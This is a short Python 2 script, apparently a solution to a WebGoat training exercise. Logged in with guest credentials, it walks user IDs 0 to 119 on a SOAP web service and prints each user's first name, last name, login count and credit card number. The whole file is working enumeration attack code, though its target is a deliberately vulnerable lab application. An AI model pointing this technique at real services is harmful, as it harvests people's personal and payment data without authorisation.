import sys

from ZSI import ParseException, EvaluateException
from ZSI.client import Binding
from ZSI.auth import AUTH
import getopt

def usage():
    print >> sys.stderr, """
{0} - webgoat WS attack
usage is: {0} -u url [-h]
    """.format(sys.argv[0])
    
def process_args(argv):
    url = None
    try:
        opts, args = getopt.getopt(argv, 'hu:')

        for opt, arg in opts:
            if opt == '-h':
                usage()
                sys.exit(2)
            elif opt == '-u':
                url = arg
    except getopt.GetoptError:
        print >> sys.stderr, "invalid argument"
        usage()
        sys.exit(1)
        
    return(url)

def attack(b, sf):
    for id in range (0, 120):
        try:
            soap_values = [ id ]
            
            for f in sf:
                ret = getattr(b, f)(id)
                soap_values.append(ret.get('{0}Return'.format(f), None))
                
            print "soap functions: {0} {1} {2} {3}".format(*sf)
            print "id: {0}: {1}, {2}, {3}, {4}".format(*soap_values)
            
        except EvaluateException, e:
            if e.str == "Non-nillable element is NIL":
                continue
            else:
                print "\nEvaluateException: {0}".format(str(e))
                break
        except Exception, e:
            print "\nException: {0}: {1}".format(type(e), str(e))
            break

if __name__ == "__main__":
    soap_funcs = ['getFirstName', 'getLastName', 'getLoginCount', 'getCreditCard']
    
    try:
        url = process_args(sys.argv[1:])
        if url is None:
            raise(TypeError("missing arguments"))
    
        bind = Binding(url = url)
        bind.SetAuth(AUTH.httpbasic, 'guest', 'guest')
        attack(bind, soap_funcs)
        
    except TypeError, e:
        print >> sys.stderr, e
        usage()
        sys.exit(3)
    finally:
        sys.exit(0)